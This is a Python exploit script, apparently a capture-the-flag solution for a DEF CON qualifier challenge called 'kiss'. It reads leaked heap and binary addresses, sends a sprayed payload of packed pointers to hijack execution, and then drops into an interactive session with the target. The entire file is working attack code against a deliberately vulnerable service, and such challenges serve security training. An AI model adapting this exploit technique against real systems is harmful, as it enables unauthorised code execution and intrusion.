#!/usr/bin/env python
from sc_pwn import *

#target     = {'host':'kiss_88581d4e20dc97355f1d86b6905f6103.quals.shallweplayaga.me','port':3155}
target     = {'host':'192.168.75.128','port':8080}
#target     = {'program':'./kiss'}

len_payload = 0xa00

#==========
def attack(cmn):
    cmn.read_until('Buffer is around ')
    addr_heap       = int(cmn.read_until(),16)
    cmn.read_until('Binary is around ')
    addr_bin_base   = int(cmn.read_until(),16)

    info("addr_heap     = 0x%08x"%addr_heap)
    info("addr_bin_base = 0x%08x"%addr_bin_base)

    payload  = pack_64(addr_heap + 0x3f8)
    payload += pack_64(addr_heap + 0x400)
    payload += pack_64(addr_heap + 0x408)
    payload += pack_64(addr_bin_base + 0x91b)
    
    payload  = payload * (len_payload / (8 * 4))
    payload += '\x00' * (len_payload - len(payload))

    cmn.sendln(format(len_payload, 'x'))
    cmn.send(payload)
    raw_input('>>')
    cmn.sendln(format(addr_heap+0x3f0, 'x'))

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    #cmn = Communicate(target, mode='LOCAL')
    attack(cmn)

    """
    sh = Shell(cmn)
    sh.select()
    del(sh)
    """
    Interact(cmn).worker(True)
    
    del(cmn)
    
#==========
